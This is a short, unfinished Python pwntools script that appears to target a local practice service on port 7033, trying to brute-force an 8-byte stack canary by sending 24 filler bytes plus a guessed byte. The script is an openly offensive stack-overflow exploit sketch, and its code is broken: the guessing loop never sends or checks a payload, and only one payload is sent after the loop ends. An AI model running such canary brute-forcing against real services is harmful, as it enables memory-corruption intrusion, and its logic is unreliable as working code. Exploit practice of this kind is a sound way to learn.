from pwn import *

# Set the target host and port
target_host = '127.0.0.1'
target_port = 7033

COOKIE_LENGTH = 8
cookie = [] 

# Connect to the target
p = remote(target_host, target_port)

try:
    # Receive and print the initial message from the server
    initial_message = p.recvline()
    print(f"[*] Received initial message: {initial_message.decode()}")

    #guess cookie here
    for each_byte in range(COOKIE_LENGTH):
        for each_value in range(256):
            guess_byte = p8(each_value)

            # Send a line when prompted for a name
            payload = b"A"*24 + guess_byte
        
            #if guess is correct add to cookie list 
            #check if correct by  spawn a thread for each guess or timeout method
            # if wrong, move to next guess
        



    p.sendline(payload)       # Send the payload

    #if receive response, cookie guess correct, save to cookie list
    # Receive and print the response from the server
    response = p.recvline()
    print(f"[*] Received response: {response.decode()}")

finally:
    # Close the connection
    p.close()
